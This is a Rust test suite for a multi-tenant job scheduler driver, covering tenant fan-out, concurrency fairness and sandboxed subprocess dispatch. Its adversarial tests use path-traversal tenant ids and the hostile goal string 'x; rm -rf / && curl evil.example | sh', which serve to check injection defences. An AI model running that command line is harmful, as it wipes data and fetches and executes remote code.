//! Table-driven tests for the tenant-fanning driver ([`StoreDriver`]).
//!
//! The fanning + per-tenant claim logic is exercised through
//! [`StoreDriver::tick_with_exec`] with a **fake executor** that records the
//! `(tenant, goal)` pairs it fires — so the driver is proven without standing up a
//! whole [`Agent`](crate::agent::Agent). Jobs are seeded into a shared in-memory
//! [`MemoryBackend`] via `StoreScheduler` (the durable registry half), then the
//! driver is built over the *same* backend with a clock advanced past the due time.

use super::*;
use agent_config_store::MemoryBackend;
use agent_core::Scheduler;
use std::sync::atomic::AtomicU64;
use std::sync::Mutex;
use std::time::Duration;

/// Deterministic clocks: a fixed epoch and one advanced past an `every 3600s` fire.
const T0: u64 = 1_704_067_200_000;
const DUE: u64 = T0 + 3_600_000 + 1;

fn clock(ms: u64) -> Arc<dyn Fn() -> u64 + Send + Sync> {
    Arc::new(move || ms)
}

fn noop_observer() -> RunObserver {
    Arc::new(|_run: &agent_core::Run| {})
}

/// Seed one recurring job for `tenant` into `backend` (scheduled at `T0`, so it is
/// due at `DUE`).
async fn seed(backend: &Arc<dyn Backend>, tenant: &str, goal: &str) {
    let s = StoreScheduler::with_tenant(backend.clone(), tenant)
        .expect("safe tenant")
        .with_clock(clock(T0));
    s.schedule("every 3600s", goal).await.expect("schedule");
}

/// A recorder + a cloneable exec that appends every `(tenant, goal)` it fires.
type Rec = Arc<Mutex<Vec<(String, String)>>>;
fn recorder() -> (
    Rec,
    impl Fn(String, String) -> std::future::Ready<agent_core::Result<String>> + Clone,
) {
    let rec: Rec = Arc::new(Mutex::new(Vec::new()));
    let r = rec.clone();
    let exec = move |tenant: String, goal: String| {
        r.lock().unwrap().push((tenant, goal));
        std::future::ready(Ok(String::from("ok")))
    };
    (rec, exec)
}

fn driver(backend: Arc<dyn Backend>, per_tenant: bool, at_ms: u64) -> StoreDriver {
    StoreDriver::new(backend, per_tenant, 900_000, 64, noop_observer()).with_clock(clock(at_ms))
}

// desc: a single-tenant durable install (per_tenant=false) fires its due `local`
// job → expect fired==1 and the exec saw exactly ("local", goal).
#[tokio::test]
async fn positive_single_tenant_local_fires() {
    let backend: Arc<dyn Backend> = Arc::new(MemoryBackend::new());
    seed(&backend, "local", "daily digest").await;
    let (rec, exec) = recorder();
    let fired = driver(backend, false, DUE).tick_with_exec(exec).await;
    assert_eq!(fired, 1);
    let got = rec.lock().unwrap().clone();
    assert_eq!(got, vec![("local".to_string(), "daily digest".to_string())]);
}

// desc: with per_tenant on, the driver fans over every tenant that owns a job →
// expect both acme's and globex's jobs fire, each recorded under its own tenant.
#[tokio::test]
async fn positive_two_tenants_both_fire() {
    let backend: Arc<dyn Backend> = Arc::new(MemoryBackend::new());
    seed(&backend, "acme", "acme goal").await;
    seed(&backend, "globex", "globex goal").await;
    let (rec, exec) = recorder();
    let fired = driver(backend, true, DUE).tick_with_exec(exec).await;
    assert_eq!(fired, 2);
    let mut got = rec.lock().unwrap().clone();
    got.sort();
    assert_eq!(
        got,
        vec![
            ("acme".to_string(), "acme goal".to_string()),
            ("globex".to_string(), "globex goal".to_string()),
        ]
    );
}

// desc: a single-tenant driver (per_tenant=false) never fires another tenant's
// jobs, even though they exist in the store → expect acme's job untouched (fired 0).
#[tokio::test]
async fn corner_per_tenant_false_ignores_other_tenants() {
    let backend: Arc<dyn Backend> = Arc::new(MemoryBackend::new());
    seed(&backend, "acme", "acme goal").await;
    let (rec, exec) = recorder();
    let fired = driver(backend, false, DUE).tick_with_exec(exec).await;
    assert_eq!(fired, 0, "per_tenant=false drives only `local`");
    assert!(rec.lock().unwrap().is_empty());
}

// desc: per_tenant on, but no job cards exist → tenant discovery is empty → expect
// nothing driven, nothing fired.
#[tokio::test]
async fn corner_per_tenant_empty_backend_no_fire() {
    let backend: Arc<dyn Backend> = Arc::new(MemoryBackend::new());
    let (rec, exec) = recorder();
    let fired = driver(backend, true, DUE).tick_with_exec(exec).await;
    assert_eq!(fired, 0);
    assert!(rec.lock().unwrap().is_empty());
}

// desc (boundary): a job not yet due does not fire → tick with a clock *before* the
// fire time leaves it untouched (fired 0).
#[tokio::test]
async fn boundary_not_due_no_fire() {
    let backend: Arc<dyn Backend> = Arc::new(MemoryBackend::new());
    seed(&backend, "local", "later").await;
    let (rec, exec) = recorder();
    // One ms before the next fire.
    let fired = driver(backend, false, T0 + 3_600_000 - 1)
        .tick_with_exec(exec)
        .await;
    assert_eq!(fired, 0);
    assert!(rec.lock().unwrap().is_empty());
}

// desc (negative): an executor that errors still counts the job as fired (the run
// is recorded Failed by the scheduler) → expect fired==1 despite the Err.
#[tokio::test]
async fn negative_exec_error_still_fires() {
    let backend: Arc<dyn Backend> = Arc::new(MemoryBackend::new());
    seed(&backend, "local", "flaky").await;
    let exec = |_t: String, _g: String| {
        std::future::ready(Err(agent_core::Error::Scheduler("boom".into())))
    };
    let fired = driver(backend, false, DUE).tick_with_exec(exec).await;
    assert_eq!(fired, 1, "a due job is fired even if its run fails");
}

// desc (adversarial): a hostile tenant segment is never built into a scheduler
// (fail closed, no base-view fallback, no escape) → `scheduler_for` returns None
// for traversal/separator ids and Some for a valid one.
#[tokio::test]
async fn adversarial_hostile_tenant_not_built() {
    let backend: Arc<dyn Backend> = Arc::new(MemoryBackend::new());
    let d = driver(backend, true, DUE);
    for hostile in ["../etc", "a/b", "..", "-lead"] {
        assert!(
            d.scheduler_for(hostile).is_none(),
            "hostile tenant `{hostile}` must not build a scheduler"
        );
    }
    assert!(d.scheduler_for("acme").is_some(), "a valid tenant builds");
    assert!(
        d.scheduler_for(agent_scheduler::store::DEFAULT_TENANT)
            .is_some(),
        "the default `local` tenant builds"
    );
}

// desc (durability): a job seeded via one scheduler instance is fired by a
// driver built later over the same backend → the two never share memory, only the
// store, proving the driver reads persisted jobs.
#[tokio::test]
async fn corner_driver_reads_persisted_jobs() {
    let backend: Arc<dyn Backend> = Arc::new(MemoryBackend::new());
    seed(&backend, "local", "survives").await;
    // A completely fresh driver over the same backend.
    let (rec, exec) = recorder();
    let fired = StoreDriver::new(backend.clone(), false, 900_000, 64, noop_observer())
        .with_clock(clock(DUE))
        .tick_with_exec(exec)
        .await;
    assert_eq!(fired, 1);
    assert_eq!(rec.lock().unwrap()[0].1, "survives");
}

// ── scheduler S2 — fairness (global ceiling + round-robin + per-tenant cap) ──

/// A shared current/peak concurrency observer, so a test can assert how many jobs
/// ran at once (a check-the-check fixture).
#[derive(Clone)]
struct Peak {
    current: Arc<AtomicUsize>,
    peak: Arc<AtomicUsize>,
}
impl Peak {
    fn new() -> Self {
        Self {
            current: Arc::new(AtomicUsize::new(0)),
            peak: Arc::new(AtomicUsize::new(0)),
        }
    }
    fn seen(&self) -> usize {
        self.peak.load(Ordering::SeqCst)
    }
}

/// A cloneable exec that records observed peak concurrency: it holds each "run" for
/// `hold` so overlapping dispatches actually coincide.
fn peak_exec(
    p: Peak,
    hold: Duration,
) -> impl Fn(
    String,
    String,
) -> std::pin::Pin<Box<dyn Future<Output = agent_core::Result<String>> + Send>>
       + Clone {
    move |_t, _g| {
        let p = p.clone();
        Box::pin(async move {
            let cur = p.current.fetch_add(1, Ordering::SeqCst) + 1;
            p.peak.fetch_max(cur, Ordering::SeqCst);
            tokio::time::sleep(hold).await;
            p.current.fetch_sub(1, Ordering::SeqCst);
            Ok(String::from("ok"))
        })
    }
}

/// A clock backed by an `AtomicU64`, so a single driver instance (which owns the
/// round-robin cursor) can be ticked at two different times.
fn advancing_clock(t: Arc<AtomicU64>) -> Arc<dyn Fn() -> u64 + Send + Sync> {
    Arc::new(move || t.load(Ordering::SeqCst))
}

// desc: with several jobs across two tenants and a serial ceiling, dispatch order
// alternates tenants (round-robin interleave) rather than draining one tenant fully
// before the next.
#[tokio::test]
async fn positive_round_robin_interleaves_tenants() {
    let backend: Arc<dyn Backend> = Arc::new(MemoryBackend::new());
    seed(&backend, "acme", "a1").await;
    seed(&backend, "acme", "a2").await;
    seed(&backend, "globex", "g1").await;
    seed(&backend, "globex", "g2").await;
    let (rec, exec) = recorder();
    // Default fairness (1, 1) → serial + FIFO, so recorded order == dispatch order.
    let fired = driver(backend, true, DUE).tick_with_exec(exec).await;
    assert_eq!(fired, 4);
    let got = rec.lock().unwrap().clone();
    // No tenant fires twice in a row — the mark of interleave, not drain-then-drain.
    for pair in got.windows(2) {
        assert_ne!(
            pair[0].0, pair[1].0,
            "consecutive dispatches must alternate tenants: {got:?}"
        );
    }
}

// desc: the global ceiling bounds how many jobs fire at once, even with many due.
#[tokio::test]
async fn positive_global_ceiling_bounds_concurrency() {
    let backend: Arc<dyn Backend> = Arc::new(MemoryBackend::new());
    for i in 0..5 {
        seed(&backend, "local", &format!("job{i}")).await;
    }
    let p = Peak::new();
    // Global ceiling 2, per-tenant unbounded → global is the only limiter.
    let fired = driver(backend, false, DUE)
        .with_fairness(2, 0)
        .tick_with_exec(peak_exec(p.clone(), Duration::from_millis(40)))
        .await;
    assert_eq!(fired, 5);
    assert_eq!(
        p.seen(),
        2,
        "observed concurrency must reach and not exceed the ceiling"
    );
}

// desc: the per-tenant cap keeps a single tenant serial even when the global
// ceiling would allow more.
#[tokio::test]
async fn positive_per_tenant_inflight_cap() {
    let backend: Arc<dyn Backend> = Arc::new(MemoryBackend::new());
    for i in 0..4 {
        seed(&backend, "local", &format!("job{i}")).await;
    }
    let p = Peak::new();
    // High global ceiling, but one-at-a-time per tenant.
    let fired = driver(backend, false, DUE)
        .with_fairness(8, 1)
        .tick_with_exec(peak_exec(p.clone(), Duration::from_millis(40)))
        .await;
    assert_eq!(fired, 4);
    assert_eq!(
        p.seen(),
        1,
        "one tenant's jobs must not run concurrently under the per-tenant cap"
    );
}

// desc (corner): the round-robin cursor advances the starting tenant between ticks,
// so no tenant is perpetually first.
#[tokio::test]
async fn corner_rotation_advances_start_tenant() {
    let backend: Arc<dyn Backend> = Arc::new(MemoryBackend::new());
    seed(&backend, "acme", "a").await;
    seed(&backend, "globex", "g").await;
    let t = Arc::new(AtomicU64::new(DUE));
    // One driver instance (it owns the rotation cursor), ticked twice.
    let d = StoreDriver::new(backend, true, 900_000, 64, noop_observer())
        .with_clock(advancing_clock(t.clone()));

    let (rec1, exec1) = recorder();
    assert_eq!(d.tick_with_exec(exec1).await, 2);
    let first_tick_start = rec1.lock().unwrap()[0].0.clone();

    // Advance well past the next interval so both recurring jobs are due again.
    t.store(T0 + 100 * 3_600_000, Ordering::SeqCst);
    let (rec2, exec2) = recorder();
    assert_eq!(d.tick_with_exec(exec2).await, 2);
    let second_tick_start = rec2.lock().unwrap()[0].0.clone();

    assert_ne!(
        first_tick_start, second_tick_start,
        "the starting tenant must rotate between ticks"
    );
}

// desc (boundary): a `0` global ceiling is unbounded — every claimed job still
// fires (no ceiling error, no dropped job).
#[tokio::test]
async fn boundary_max_concurrent_zero_unbounded() {
    let backend: Arc<dyn Backend> = Arc::new(MemoryBackend::new());
    for i in 0..3 {
        seed(&backend, "local", &format!("job{i}")).await;
    }
    let (rec, exec) = recorder();
    let fired = driver(backend, false, DUE)
        .with_fairness(0, 0)
        .tick_with_exec(exec)
        .await;
    assert_eq!(fired, 3);
    assert_eq!(rec.lock().unwrap().len(), 3);
}

// ── scheduler S2b — sandboxed subprocess dispatch ──

/// A sandbox double that records every `ExecSpec` and returns a canned result, so a
/// test can assert the argv / network / env the driver dispatches, without spawning
/// a real process (pattern: `agent-git/src/cli.rs` RecordingSandbox).
struct RecordingSandbox {
    calls: Arc<Mutex<Vec<agent_core::ExecSpec>>>,
    result: Result<agent_core::ExecOutput, ()>,
}
impl RecordingSandbox {
    fn returning(out: agent_core::ExecOutput) -> Self {
        Self {
            calls: Arc::new(Mutex::new(Vec::new())),
            result: Ok(out),
        }
    }
    fn failing() -> Self {
        Self {
            calls: Arc::new(Mutex::new(Vec::new())),
            result: Err(()),
        }
    }
    fn last(&self) -> agent_core::ExecSpec {
        self.calls.lock().unwrap().last().cloned().expect("a call")
    }
    fn call_count(&self) -> usize {
        self.calls.lock().unwrap().len()
    }
}
#[async_trait::async_trait]
impl agent_core::Sandbox for RecordingSandbox {
    async fn exec(
        &self,
        spec: &agent_core::ExecSpec,
    ) -> agent_core::Result<agent_core::ExecOutput> {
        self.calls.lock().unwrap().push(spec.clone());
        self.result
            .clone()
            .map_err(|()| agent_core::Error::Sandbox("sandbox down".into()))
    }
    fn capabilities(&self) -> agent_core::SandboxCapabilities {
        agent_core::SandboxCapabilities::default()
    }
}

fn exit_output(code: i32, stdout: &str, stderr: &str) -> agent_core::ExecOutput {
    agent_core::ExecOutput {
        stdout: stdout.into(),
        stdout_bytes: stdout.as_bytes().to_vec(),
        stderr: stderr.into(),
        exit_code: code,
        timed_out: false,
    }
}

// desc: a fired job is dispatched as `agent --config … --run-scheduled-job --tenant T
// <goal>` under the sandbox, network On + env Inherit; exit 0 → the stdout answer.
#[tokio::test]
async fn positive_dispatches_subprocess_with_tenant_argv() {
    let sb = Arc::new(RecordingSandbox::returning(exit_output(0, "done", "")));
    let dyn_sb: Arc<dyn agent_core::Sandbox> = sb.clone();
    let out = super::dispatch_subprocess(
        &dyn_sb,
        std::path::Path::new("/opt/agent"),
        "config/agent.toml",
        3600,
        "acme",
        "run the daily digest",
    )
    .await;
    assert_eq!(out.unwrap(), "done");
    let spec = sb.last();
    assert_eq!(
        spec.argv,
        vec![
            "/opt/agent".to_string(),
            "--config".to_string(),
            "config/agent.toml".to_string(),
            "--run-scheduled-job".to_string(),
            "--tenant".to_string(),
            "acme".to_string(),
            "--".to_string(),
            "run the daily digest".to_string(),
        ]
    );
    assert_eq!(spec.network, agent_core::NetworkPolicy::On);
    assert_eq!(spec.env, agent_core::EnvPolicy::Inherit);
    assert_eq!(spec.timeout_secs, 3600);
}

// desc (negative): a non-zero child exit becomes a Failed run carrying the code + stderr.
#[tokio::test]
async fn negative_nonzero_exit_recorded_failed() {
    let sb = Arc::new(RecordingSandbox::returning(exit_output(2, "", "kaboom")));
    let dyn_sb: Arc<dyn agent_core::Sandbox> = sb.clone();
    let out =
        super::dispatch_subprocess(&dyn_sb, std::path::Path::new("/a"), "c.toml", 60, "t", "g")
            .await;
    let err = out.unwrap_err().to_string();
    assert!(err.contains("exited 2"), "{err}");
    assert!(err.contains("kaboom"), "{err}");
}

// desc (boundary): a timed-out child is a Failed run naming the timeout.
#[tokio::test]
async fn boundary_timeout_recorded_failed() {
    let timed_out = agent_core::ExecOutput {
        timed_out: true,
        ..exit_output(0, "", "")
    };
    let sb = Arc::new(RecordingSandbox::returning(timed_out));
    let dyn_sb: Arc<dyn agent_core::Sandbox> = sb.clone();
    let out =
        super::dispatch_subprocess(&dyn_sb, std::path::Path::new("/a"), "c.toml", 30, "t", "g")
            .await;
    assert!(out.unwrap_err().to_string().contains("timed out"));
}

// desc (corner): a sandbox exec error propagates (the job is Failed, not silently ok).
#[tokio::test]
async fn corner_sandbox_error_propagates() {
    let sb = Arc::new(RecordingSandbox::failing());
    let dyn_sb: Arc<dyn agent_core::Sandbox> = sb.clone();
    let out =
        super::dispatch_subprocess(&dyn_sb, std::path::Path::new("/a"), "c.toml", 60, "t", "g")
            .await;
    assert!(out.is_err());
    assert_eq!(sb.call_count(), 1, "the sandbox was invoked exactly once");
}

// desc (adversarial): a hostile goal is passed as ONE argv element — argv mode means
// no shell, so `; rm -rf /` and friends can never be word-split or interpreted.
#[tokio::test]
async fn adversarial_goal_passed_as_single_argv_no_shell() {
    let sb = Arc::new(RecordingSandbox::returning(exit_output(0, "ok", "")));
    let dyn_sb: Arc<dyn agent_core::Sandbox> = sb.clone();
    let hostile = "x; rm -rf / && curl evil.example | sh # $(whoami)";
    let _ = super::dispatch_subprocess(
        &dyn_sb,
        std::path::Path::new("/a"),
        "c.toml",
        60,
        "acme",
        hostile,
    )
    .await;
    let spec = sb.last();
    assert_eq!(spec.argv.len(), 8, "no extra tokens: {:?}", spec.argv);
    assert_eq!(
        spec.argv.last().unwrap(),
        hostile,
        "the whole goal is one argv element, verbatim"
    );
    assert_eq!(
        spec.argv[spec.argv.len() - 2],
        "--",
        "a `--` end-of-options separator precedes the untrusted goal"
    );
    assert!(
        spec.command.is_empty(),
        "argv mode: the shell `command` field is unused"
    );
}

// desc (adversarial): a flag-like goal passed after `--` reaches the argv verbatim,
// never split off a leading `--tenant`/flag token — the separator neutralises argv
// flag smuggling into the child.
#[tokio::test]
async fn adversarial_flag_like_goal_is_after_separator() {
    let sb = Arc::new(RecordingSandbox::returning(exit_output(0, "ok", "")));
    let dyn_sb: Arc<dyn agent_core::Sandbox> = sb.clone();
    let _ = super::dispatch_subprocess(
        &dyn_sb,
        std::path::Path::new("/a"),
        "c.toml",
        60,
        "acme",
        "--serve-mcp",
    )
    .await;
    let spec = sb.last();
    let sep = spec
        .argv
        .iter()
        .position(|a| a == "--")
        .expect("a -- separator");
    assert_eq!(
        &spec.argv[sep + 1..],
        &["--serve-mcp".to_string()],
        "the flag-like goal sits after `--`, so the child treats it as a positional"
    );
    // And `--tenant` appears exactly once (the real one), never smuggled by the goal.
    assert_eq!(spec.argv.iter().filter(|a| *a == "--tenant").count(), 1);
}
